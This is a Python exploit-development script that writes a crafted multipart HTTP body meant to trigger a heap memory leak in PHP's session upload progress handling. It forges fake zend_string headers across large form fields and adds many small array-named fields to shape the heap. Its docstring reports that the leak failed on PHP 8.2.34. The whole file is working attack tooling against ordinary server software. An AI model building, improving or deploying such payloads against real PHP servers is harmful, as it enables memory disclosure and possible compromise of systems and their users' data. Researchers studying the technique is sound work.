#!/usr/bin/env python3
"""Leak-B body with a fake zend_string header on every page of each forge field.
The PS(id) reclaim should then leak from any page, but on 8.2.34 it never did.
Layout follows 9bie's mk_leak_b: session fields, ~2MB forge fields, then tiny x fields."""
from __future__ import annotations

import argparse
import struct

BOUNDARY = b"C" * 10


def forge_fill_all(pages: int, fake_len: int) -> bytes:
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    for page in range(1, pages):
        hdr = page * 0x1000 - 0x1018
        if hdr < 0 or hdr + 0x20 > L:
            continue
        struct.pack_into("<I", v, hdr + 0x00, 0)          # refcount 0
        struct.pack_into("<I", v, hdr + 0x04, 0x16)       # IS_STRING|NOT_COLLECTABLE
        struct.pack_into("<Q", v, hdr + 0x08, 0)          # h
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)   # len
        v[hdr + 0x18:hdr + 0x18 + 8] = b"BBBB/BBB"        # valid_key FAILURE
    return bytes(v)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--sid", default="a")
    ap.add_argument("--progress", default="k0")
    ap.add_argument("--name-len", type=int, default=120)
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0xC8000)
    ap.add_argument("--pages", type=int, default=511)
    ap.add_argument("--nforge", type=int, default=16)
    ap.add_argument("--xrun", type=int, default=900)
    args = ap.parse_args()

    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" + name +
                   b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", args.sid.encode())
    part(b"PHP_SESSION_UPLOAD_PROGRESS", args.progress.encode())

    v = forge_fill_all(args.pages, args.fake_len)
    idx = 0
    for _ in range(args.nforge):
        name = (b"f%04d" % idx).ljust(args.name_len, b"f")[:args.name_len]
        part(name, v)
        idx += 1
    for _ in range(args.xrun):
        nm = ("x%05d" % idx).encode() + b"[a]" * 12
        part(nm, b"v")
        idx += 1

    out.extend(b"--" + BOUNDARY + b"--\r\n")
    with open(args.out, "wb") as fh:
        fh.write(bytes(out))
    print("body=%d forge=%d fake_len=%#x" % (len(out), args.nforge, args.fake_len))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
